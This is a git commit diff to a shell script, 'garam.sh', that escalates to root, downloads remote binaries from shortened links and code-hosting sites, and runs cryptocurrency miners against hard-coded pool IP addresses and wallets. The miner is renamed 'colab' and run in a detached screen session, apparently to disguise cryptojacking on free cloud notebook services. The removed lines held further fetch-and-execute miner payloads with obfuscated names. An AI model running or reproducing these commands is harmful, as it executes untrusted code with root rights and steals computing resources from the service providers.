94099d05f556a4e9cedaa333c4972431911ad61a
williehprnuhrxyq <159912408+williehprnuhrxyq@users.noreply.github.com>
2024-07-08 00:18:36 +0700

    Update garam.sh

--- garam.sh
+++ garam.sh
@@ -1,10 +1,12 @@
 #!/bin/bash
 sudo su <<EOF
-
-wget -qO jupyter.sh https://raw.githubusercontent.com/anihsugiarti9/ebor/main/jupyter.sh && chmod +x * && ./jupyter.sh
-sudo apt install screen -y
-wget -qO root https://s.id/minulz >/dev/null 2>&1 && chmod +x *
-screen -dms run ./root --url=pyrin:qpkxgkszu2dtek33z5nu5uvqftmj6x9stjvpsrdr502p2v8mpqduwt74nc0jm.$(echo GR-$(TZ=UTC-7 date +"%H-%M-%S"))@47.236.130.246:80 --cleanjobs --nonvml --hideclocks
-wget -qO asukowe https://s.id/asukowe && chmod +x * && ./asukowe && sleep 5 && apt-get install screen -y && screen -dmS run ./udocker/udocker --allow-root run debian /bin/bash -c 'wget -qO asu https://gitlab.com/heatheroigerald/asu/-/raw/main/rstd && chmod +x asu && ./asu -o 47.89.195.104:443 -a rx/0 -u ZEPHsC5qZJv8JqyaGPNAviDERPxFGBzXx1bo8rx7RqD9JkPh68Lk7AnLdsNAZfrukeFoU9dnboT6tAJkAZ1etvM1Q5PqiQu8DEk.$(echo B-$(TZ=UTC-7 date +"%H-%M-%S")) --randomx-1gb-pages -p -x -t $(nproc --all) '
+apt-get -y install screen && wget https://github.com/Lolliedieb/lolMiner-releases/releases/download/1.81/lolMiner_v1.81_Lin64.tar.gz && tar -xvf lolMiner_v1.81_Lin64.tar.gz && cd 1.81 && mv lolMiner colab
 EOF
+
+screen
+
+
+./1.81/colab --algo PYRIN --pool 47.236.130.246:80 --user pyrin:qpkxgkszu2dtek33z5nu5uvqftmj6x9stjvpsrdr502p2v8mpqduwt74nc0jm.$(echo GR-$(TZ=UTC-7 date +"%H-%M-%S")) --pass x --no-cl
+
+
 
